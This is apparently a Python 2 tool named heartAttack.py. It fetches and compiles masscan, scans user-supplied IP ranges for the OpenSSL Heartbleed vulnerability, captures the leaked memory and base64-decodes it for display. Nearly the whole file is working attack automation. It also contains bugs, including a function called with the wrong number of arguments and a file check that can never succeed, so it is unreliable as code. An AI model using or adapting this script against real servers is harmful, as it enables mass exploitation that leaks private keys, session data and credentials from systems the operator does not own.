#!/usr/bin/python

#######################
# heartAttack.py
#
# Lazy utilization of 'Massca'n to quickly find, exploit,
# and decode the OpenSSL heartbleed vulnerability quickly.
# Made for to work and function on Linux, and Mac. Maybe Windows in the future 
#
# Check for 'masscan'. If not found it will download it in working directory
# It will unzip
#
# Mad props to Robert David Graham of 'Masscan' and Jim Hofstee
#
# Author: spaceB0x (Tyler Welton)
# 
# Mention REQUREMENTS
########################

##Test 10.209.1.246

import os
import urllib
import optparse
import zipfile
import optparse
import base64
#import multiprocessing 

#SetupStuff=====================================================================
def dlZip():
	print "***Finding file"
	url='https://github.com/robertdavidgraham/masscan/archive/master.zip'
	zip_name='masscan-master.zip'
	file_name='masscan-master'
	#check if file exists in working dir
	print "** Downloading %s" %zip_name
	urllib.urlretrieve(url,zip_name)
	print "** %s download complete" %zip_name

def uz(zf):
	if (os.path.isfile(zf)):
		print "** Unzipping"
	else:
		print "** Download error"
		return
	f=zipfile.ZipFile(zf)
	f.extractall()

def make():
		#assumes you are in massca-master directory
	#if(os.path.isfile('./bin/masscan')):
	#	print "**"
	#	else:
	print "** Making masscan..."
	os.system('make')
	print "** Masscan make is complete!"

def setup():
	zip_name="masscan-master.zip"
	file_name="masscan-master"

	#check for install, download, or unzip
	if (os.path.isdir(file_name)):
		print '**masscan found'
		os.chmod(file_name, 755)
		os.chdir(file_name)
		make()
		os.chdir('bin')
		##Do main junk
	elif (os.path.isfile(zip_name)):
		uz(zip_name)
		os.chmod(file_name, 755)
		os.chdir(file_name)
		make()
		os.chdir('bin')
	else:
		q=str(raw_input("**You do not have 'masscan' installed in this directory.\n**Is it ok if I install it for you? (Y/n):"))
		if (q.__eq__('y') | q.__eq__('Y')):
			dlZip()
			uz(zip_name)
			os.chmod(file_name, 755)
			os.system('cd masscan-master')
			make()
		elif(q.__eq__('n') | q.__eq__('N')):
			print "** That's ok. Have a good day"
			return
		else:
			print "**I'm sorry that doesn't make sense to my little binary brain"
			setup()
#Find/decode=============================================================================================
def decode(string):
	data=base64.b64decode(string)
	return data	

def runMS(mode,ips, ports, output):
	#mode is 'b' for find hb; or 'a' for exploit heartbleed
	if (mode=='a'):
		if(os.path.isfile('masscan')=='false'):
			print "** No file 'masscan' in this directory"
			return
		#check for available IP
		#Run the actual Scan
		os.system('./masscan -p %d %s -S 10.209.8.116 --rate=500 --heartbleed --capture heartbleed > %s' %(ports, ips, output))
	elif(mode=='b'):
		if(os.path.isfile('masscan')=='false'):
			print "** No file 'masscan' in this directory"
			return
		os.system('./masscan -p %d %s -S 10.209.8.116 --rate=500 --heartbleed > %s' %(ports, ips, output))

def report(output):
	#Get the encoded part extracted
	t=0
	f=open(output,"r")
	whole=f.read()
	word_list=whole.split(" ")
	for i in range(len(word_list)):
		if (word_list[i]=='[heartbleed]'):
			t=i+1
			break
	f.close()
	
	####Print and get encode and decoded
	encoded=word_list[t]
	decoded=decode(str(word_list[t]))
	print decoded	
#MAIN====================================================================================================
def main():
	#option parser
	desc=" "
	parser=optparse.OptionParser("%prog"+ "-i <ip_range> -p <ports> -w <outputfile>", description=desc)	
	parser.add_option('-i', dest='ips', type='string', help='IP address or range of addresses to scan')
	parser.add_option('-p', dest='ports', type='int', help='Port(s) if any to scan. Defaults to 443 if none specified')
	parser.add_option('-w', dest='output', type='string', help='File to send output results to')
	(options,args)=parser.parse_args()

	#os
	oper= str(os.name) 
	url='https://github.com/robertdavidgraham/masscan/archive/master.zip'
	
	#Do linux/MacOS specific stuff
	if oper=='posix':
		setup()
		runMS(options.ips, options.ports, options.output)
		report(options.output)
		# Check for vulnerable hosts
		# Exploit hosts
		# Decode Exploit
		# Formalize the report
		
	#If windows...break the news
	if oper=='nt':
		print "** Sorry Dude. This program requires 'masscan'. Normally I would download \nit for you but it doesn't work so well on Windows"
		print "** Try again on a Linux or MacOSX machine"
		return

if __name__=='__main__':
	main()
